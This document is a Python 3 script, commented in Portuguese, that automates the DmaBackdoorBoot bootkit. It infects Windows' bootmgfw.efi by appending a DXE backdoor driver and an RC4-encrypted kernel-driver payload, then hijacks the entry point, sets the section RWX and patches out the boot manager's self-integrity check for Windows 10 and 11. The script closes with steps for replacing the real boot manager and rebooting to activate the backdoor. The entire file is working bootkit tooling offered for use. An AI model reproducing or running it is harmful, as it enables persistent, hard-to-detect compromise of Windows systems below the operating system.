#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  DmaBackdoorBoot - Infector Automatizado (Python 3)
================================================================================

Script automatizado para infectar o Windows Boot Manager (bootmgfw.efi)
com o driver DXE DmaBackdoorBoot e um payload (driver kernel) embutido.

Funcionamento:
  1. Seleciona o bootmgfw.efi original
  2. Seleciona o DmaBackdoorBoot.efi (driver DXE compilado)
  3. Seleciona o driver/payload (.sys/.dll) para injetar no kernel
  4. Gera o bootmgfw.efi infectado com backup automatico

Requisitos:
  - Python 3.7+
  - pefile    (pip install pefile)
  - lznt1     (pip install lznt1)  [opcional, para compressao do payload]

Autor original: @d_olex (Cr4sh)
Atualizado para Python 3: 2026
================================================================================
"""

import sys
import os
import time
import random
import shutil
import struct
from pathlib import Path

# ==============================================================================
# CONFIGURACOES
# ==============================================================================
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQQQ'          # 5 x UINT64
INFECTOR_CONFIG_LEN = 8 * 5            # 40 bytes
INFECTOR_SIGN = b'INFECTED'            # magic no e_res do DOS header
PAYLOAD_KEY_LEN = 0x10                 # 16 bytes RC4 key


def align_up(value, alignment):
    """Alinha valor para cima."""
    return ((value + alignment - 1) // alignment) * alignment


def align_down(value, alignment):
    """Alinha valor para baixo."""
    return (value // alignment) * alignment


# ==============================================================================
# RC4 (compativel com o original)
# ==============================================================================
class RC4:
    def __init__(self, key: bytes):
        self.x = self.y = 0
        self.s = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.s[i] + key[i % len(key)]) % 256
            self.s[i], self.s[j] = self.s[j], self.s[i]

    def crypt(self, data: bytes) -> bytes:
        ret = bytearray()
        for byte in data:
            self.x = (self.x + 1) % 256
            self.y = (self.y + self.s[self.x]) % 256
            self.s[self.x], self.s[self.y] = self.s[self.y], self.s[self.x]
            ret.append(byte ^ self.s[(self.s[self.x] + self.s[self.y]) % 256])
        return bytes(ret)


# ==============================================================================
# PATCH DE INTEGRIDADE DO BOOT MANAGER
# ==============================================================================
def patch_win_boot_mgr_integrity(data: bytes) -> bytes:
    """
    Remove a verificacao de auto-integridade do bootmgr (BmFwVerifySelfIntegrity).
    Necessario para Windows 10/11.
    """
    for i in range(0, len(data) - 0x100):
        found = False

        # Windows 10 signature
        if (data[i + 0x00] == 0x89 and data[i + 0x01] == 0x4c and
            data[i + 0x26] == 0x83 and data[i + 0x27] == 0x4d and
            data[i + 0x28] == 0x38 and data[i + 0x29] == 0xff and
            data[i + 0x2a] == 0x83 and data[i + 0x2b] == 0x4d and
            data[i + 0x2c] == 0x40 and data[i + 0x2d] == 0xff):
            found = True

        # Windows 11 signature
        if (data[i + 0x00] == 0x89 and data[i + 0x01] == 0x4c and
            data[i + 0x20] == 0x83 and data[i + 0x21] == 0x4d and
            data[i + 0x22] == 0x38 and data[i + 0x23] == 0xff and
            data[i + 0x24] == 0x83 and data[i + 0x25] == 0x4d and
            data[i + 0x26] == 0x30 and data[i + 0x27] == 0xff):
            found = True

        if found:
            patch = b'\x33\xc0\xc3'  # xor eax, eax / ret
            print(f"[+] bootmgr!BmFwVerifySelfIntegrity() encontrada no offset 0x{i:08x}")
            return data[:i] + patch + data[i + len(patch):]

    raise Exception('Nao foi possivel encontrar bootmgr!BmFwVerifySelfIntegrity()')


# ==============================================================================
# FUNCAO PRINCIPAL: INFECTAR
# ==============================================================================
def infect_bootmgr(bootmgr_path: str, dxe_path: str, payload_path: str = None,
                   output_path: str = None, patch_integrity: bool = True) -> bytes:
    """
    Infecta o bootmgfw.efi com o driver DXE DmaBackdoorBoot e payload opcional.

    Args:
        bootmgr_path:   Caminho para bootmgfw.efi original
        dxe_path:       Caminho para DmaBackdoorBoot.efi (driver DXE)
        payload_path:   Caminho para driver kernel (.sys/.dll) [opcional]
        output_path:    Caminho para salvar o arquivo infectado [opcional]
        patch_integrity: Remove verificacao de integridade do bootmgr

    Returns:
        bytes do arquivo PE infectado
    """
    try:
        import pefile
    except ImportError:
        raise ImportError('pefile nao esta instalado. Execute: pip install pefile')

    # --------------------------------------------------------------------------
    # Helpers para manipular a secao .conf do driver DXE
    # --------------------------------------------------------------------------
    def _get_infector_config_offset(pe):
        for section in pe.sections:
            name = section.Name.rstrip(b'\x00')
            if name == INFECTOR_CONFIG_SECTION.encode():
                return section.PointerToRawData
        raise Exception(f'Secao {INFECTOR_CONFIG_SECTION} nao encontrada no driver DXE')

    def _get_infector_config(pe, data: bytes):
        offs = _get_infector_config_offset(pe)
        return struct.unpack(INFECTOR_CONFIG_FMT, data[offs:offs + INFECTOR_CONFIG_LEN])

    def _set_infector_config(pe, data: bytes, *args):
        offs = _get_infector_config_offset(pe)
        return data[:offs] + struct.pack(INFECTOR_CONFIG_FMT, *args) + data[offs + INFECTOR_CONFIG_LEN:]

    # --------------------------------------------------------------------------
    # Carrega imagens
    # --------------------------------------------------------------------------
    print(f"[+] Carregando bootmgr: {bootmgr_path}")
    pe_src = pefile.PE(bootmgr_path)

    if pe_src.DOS_HEADER.e_res[:len(INFECTOR_SIGN)] == INFECTOR_SIGN:
        raise Exception(f'{bootmgr_path} ja esta infectado!')

    print(f"[+] Carregando driver DXE: {dxe_path}")
    pe_dxe = pefile.PE(dxe_path)

    if pe_src.FILE_HEADER.Machine != pe_dxe.FILE_HEADER.Machine:
        raise Exception('Arquitetura incompativel entre bootmgr e driver DXE')

    # --------------------------------------------------------------------------
    # Processa payload (driver kernel) se fornecido
    # --------------------------------------------------------------------------
    if payload_path and os.path.exists(payload_path):
        try:
            import lznt1
            has_lznt1 = True
        except ImportError:
            has_lznt1 = False
            print("[!] lznt1 nao instalado. Payload nao sera comprimido.")
            print("    Instale com: pip install lznt1")

        with open(payload_path, 'rb') as fd:
            payload_data = fd.read()
        payload_data_len = len(payload_data)
        print(f"[+] Payload lido: {payload_data_len} bytes")

        if has_lznt1:
            payload_data = lznt1.compress(payload_data)
            print(f"[+] Payload comprimido: {len(payload_data)} bytes")

        # Gera chave RC4
        key = bytes([random.randrange(0x01, 0xff) for _ in range(PAYLOAD_KEY_LEN)])

        # Prepara _PAYLOAD_HEADER: UnpackedSize(4) + Key(16) + Data
        payload_data = struct.pack('I', payload_data_len) + key + RC4(key).crypt(payload_data)

        # Escreve _BACKDOOR_PAYLOAD no e_res do DOS header do DXE
        pe_dxe.DOS_HEADER.e_res = struct.pack('II', os.path.getsize(dxe_path), len(payload_data))

        data = pe_dxe.write() + payload_data
    else:
        print("[*] Nenhum payload fornecido. Infectando apenas com DXE.")
        data = pe_dxe.write()

    # --------------------------------------------------------------------------
    # Le e atualiza _INFECTOR_CONFIG
    # --------------------------------------------------------------------------
    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _get_infector_config(pe_dxe, data)

    # Encontra ultima secao do bootmgr
    last_section = None
    for section in pe_src.sections:
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:
        raise Exception('Virtual size da ultima secao deve ser <= raw size')

    raw_size = last_section.PointerToRawData + last_section.SizeOfRawData

    # Salva entry point original
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint
    print(f"[+] Entry point original RVA: 0x{conf_ep_old:08x}")
    sec_name = last_section.Name.rstrip(b"\x00").decode("ascii", errors="ignore")
    print(f"[+] Ultima secao: {sec_name}")
    print(f"[+] Tamanho original da imagem: 0x{pe_src.OPTIONAL_HEADER.SizeOfImage:08x}")

    # Atualiza _INFECTOR_CONFIG no driver DXE
    data = _set_infector_config(pe_dxe, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)

    # Padding para alinhamento
    aligned_len = align_up(len(data), pe_src.OPTIONAL_HEADER.FileAlignment)
    data += b'\x00' * (aligned_len - len(data))

    # --------------------------------------------------------------------------
    # Modifica o bootmgr
    # --------------------------------------------------------------------------
    # Novo entry point aponta para o codigo do DXE dentro da ultima secao
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = (
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new
    )

    # Aumenta a ultima secao
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # Permissoes RWX
    last_section.Characteristics = (
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] |
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] |
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']
    )
    print("[+] Permissoes da secao alteradas para RWX")

    # Atualiza tamanho da imagem
    pe_src.OPTIONAL_HEADER.SizeOfImage = (
        last_section.VirtualAddress + last_section.Misc_VirtualSize
    )
    pe_src.OPTIONAL_HEADER.SizeOfImage = align_up(
        pe_src.OPTIONAL_HEADER.SizeOfImage,
        pe_src.OPTIONAL_HEADER.SectionAlignment
    )

    # Marca como infectado
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN

    print(f"[+] Novo entry point RVA: 0x{pe_src.OPTIONAL_HEADER.AddressOfEntryPoint:08x}")
    print(f"[+] Novo tamanho da imagem: 0x{pe_src.OPTIONAL_HEADER.SizeOfImage:08x}")

    # Monta imagem final
    infected_data = pe_src.write()[:raw_size] + data

    # Patch de integridade do bootmgr (Windows 10/11)
    if patch_integrity:
        print("[*] Aplicando patch de integridade do bootmgr...")
        infected_data = patch_win_boot_mgr_integrity(bytes(infected_data))

    # --------------------------------------------------------------------------
    # Salva arquivo
    # --------------------------------------------------------------------------
    if output_path:
        with open(output_path, 'wb') as fd:
            fd.write(infected_data)
        print(f"[+] Arquivo infectado salvo: {output_path}")

    return infected_data


# ==============================================================================
# INTERFACE INTERATIVA (CLI)
# ==============================================================================
def ask_file(title: str, filetypes: list = None, must_exist: bool = True) -> str:
    """
    Pede ao usuario para selecionar um arquivo.
    Tenta usar tkinter (GUI) primeiro, cai para input() se falhar.
    """
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)

        if filetypes:
            path = filedialog.askopenfilename(title=title, filetypes=filetypes)
        else:
            path = filedialog.askopenfilename(title=title)

        root.destroy()

        if not path:
            return None
        if must_exist and not os.path.exists(path):
            print(f"[!] Arquivo nao encontrado: {path}")
            return None
        return path

    except Exception:
        # Fallback para CLI puro
        print(f"\n{title}")
        path = input('Caminho completo do arquivo: ').strip().strip('"')
        if not path:
            return None
        if must_exist and not os.path.exists(path):
            print(f"[!] Arquivo nao encontrado: {path}")
            return None
        return path


def ask_save_file(title: str, default_name: str = '') -> str:
    """Pede ao usuario onde salvar um arquivo."""
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        path = filedialog.asksaveasfilename(
            title=title,
            defaultextension='.efi',
            initialfile=default_name,
            filetypes=[('EFI files', '*.efi'), ('All files', '*.*')]
        )
        root.destroy()
        return path if path else None
    except Exception:
        print(f"\n{title}")
        path = input('Caminho para salvar: ').strip().strip('"')
        return path if path else None


def print_banner():
    print("")
    print("  ============================================================")
    print("  |                                                          |")
    print("  |    DmaBackdoorBoot - Infector Automatizado (Python 3)    |")
    print("  |                                                          |")
    print("  |    Injecao de driver kernel via Windows Boot Manager     |")
    print("  |                                                          |")
    print("  ============================================================")
    print("")


def main():
    print_banner()

    # --------------------------------------------------------------------------
    # Verifica dependencias
    # --------------------------------------------------------------------------
    try:
        import pefile
    except ImportError:
        print("[!] ERRO: pefile nao esta instalado.")
        print("    Execute:  pip install pefile")
        input('\nPressione ENTER para sair...')
        return 1

    try:
        import lznt1
    except ImportError:
        print("[!] AVISO: lznt1 nao instalado. Payload nao sera comprimido.")
        print("    Recomendado:  pip install lznt1")
        print("")

    # --------------------------------------------------------------------------
    # Passo 1: Selecionar bootmgfw.efi original
    # --------------------------------------------------------------------------
    print("[1/4] Selecione o bootmgfw.efi ORIGINAL")
    print("      (geralmente em C:\\Windows\\Boot\\EFI\\bootmgfw.efi)")
    print("")

    bootmgr = ask_file(
        'Selecione o bootmgfw.efi original',
        filetypes=[('EFI files', '*.efi'), ('All files', '*.*')]
    )
    if not bootmgr:
        print("[!] Operacao cancelada.")
        input('Pressione ENTER para sair...')
        return 1
    print(f"    -> {bootmgr}\n")

    # --------------------------------------------------------------------------
    # Passo 2: Selecionar DmaBackdoorBoot.efi (driver DXE)
    # --------------------------------------------------------------------------
    print("[2/4] Selecione o DmaBackdoorBoot.efi (driver DXE compilado)")
    print("      (gerado pelo build do EDK2)")
    print("")

    dxe = ask_file(
        'Selecione o DmaBackdoorBoot.efi',
        filetypes=[('EFI files', '*.efi'), ('All files', '*.*')]
    )
    if not dxe:
        print("[!] Operacao cancelada.")
        input('Pressione ENTER para sair...')
        return 1
    print(f"    -> {dxe}\n")

    # --------------------------------------------------------------------------
    # Passo 3: Selecionar payload (driver kernel)
    # --------------------------------------------------------------------------
    print("[3/4] Selecione o driver kernel para injetar (payload)")
    print("      (.sys ou .dll compilado para a mesma arquitetura)")
    print("      (pressione Cancelar para pular - infecta apenas com DXE)")
    print("")

    payload = ask_file(
        'Selecione o driver kernel (.sys/.dll) [opcional]',
        filetypes=[('Driver files', '*.sys *.dll'), ('All files', '*.*')],
        must_exist=False
    )
    if payload:
        print(f"    -> {payload}\n")
    else:
        print("    -> Nenhum payload selecionado\n")

    # --------------------------------------------------------------------------
    # Passo 4: Definir arquivo de saida
    # --------------------------------------------------------------------------
    print("[4/4] Onde salvar o bootmgfw.efi infectado?")
    print("")

    default_out = os.path.join(os.path.dirname(bootmgr), 'bootmgfw_infected.efi')
    output = ask_save_file('Salvar bootmgfw.efi infectado como...', 'bootmgfw_infected.efi')
    if not output:
        output = default_out
    print(f"    -> {output}\n")

    # --------------------------------------------------------------------------
    # Pergunta sobre patch de integridade
    # --------------------------------------------------------------------------
    print("-" * 64)
    print("PATCH DE INTEGRIDADE:")
    print("  O patch de BmFwVerifySelfIntegrity remove a verificacao de")
    print("  auto-integridade do bootmgr. Necessario para Windows 10/11.")
    print("")

    patch_input = input('Aplicar patch de BmFwVerifySelfIntegrity? [S/n]: ').strip().lower()
    patch_integrity = not patch_input or patch_input in ('s', 'sim', 'yes', 'y')
    if patch_integrity:
        print("    -> Patch de integridade SERÁ aplicado")
    else:
        print("    -> Patch de integridade NÃO será aplicado")
    print("")

    # --------------------------------------------------------------------------
    # Confirmacao
    # --------------------------------------------------------------------------
    print("-" * 64)
    print("RESUMO:")
    print(f"  Bootmgr original:  {bootmgr}")
    print(f"  Driver DXE:        {dxe}")
    print(f"  Payload:           {payload or "(nenhum)"}")
    print(f"  Saida:             {output}")
    print(f"  Patch integridade: {'SIM' if patch_integrity else 'NAO'}")
    print("-" * 64)
    print("")

    confirm = input('Confirmar infeccao? [S/n]: ').strip().lower()
    if confirm and confirm not in ('s', 'sim', 'yes', 'y'):
        print("[!] Operacao cancelada pelo usuario.")
        input('Pressione ENTER para sair...')
        return 0

    # --------------------------------------------------------------------------
    # Executa infeccao
    # --------------------------------------------------------------------------
    print("")
    print("[*] Iniciando infeccao...")
    print("")

    try:
        # Faz backup do original
        backup = bootmgr + '.bak'
        if not os.path.exists(backup):
            shutil.copyfile(bootmgr, backup)
            print(f"[+] Backup criado: {backup}")

        infect_bootmgr(
            bootmgr_path=bootmgr,
            dxe_path=dxe,
            payload_path=payload,
            output_path=output,
            patch_integrity=patch_integrity
        )

        print("")
        print("  ============================================================")
        print("  |  [+] INFECCAO CONCLUIDA COM SUCESSO!                     |")
        print("  ============================================================")
        print("")
        print(f"Arquivo infectado: {output}")
        print(f"Backup original:   {backup}")
        print("")
        print("Proximos passos:")
        print("  1. Copie o arquivo infectado para substituir o bootmgfw.efi original")
        print("     (requer desativacao do Secure Boot e permissoes especiais)")
        print("  2. Reinicie o sistema e o backdoor sera ativado no boot")
        print("")

    except Exception as e:
        print("")
        print("  ============================================================")
        print(f"  |  [!] ERRO: {str(e)[:54]:<54}|")
        print("  ============================================================")
        print("")
        import traceback
        traceback.print_exc()

    input('Pressione ENTER para sair...')
    return 0


if __name__ == '__main__':
    sys.exit(main())
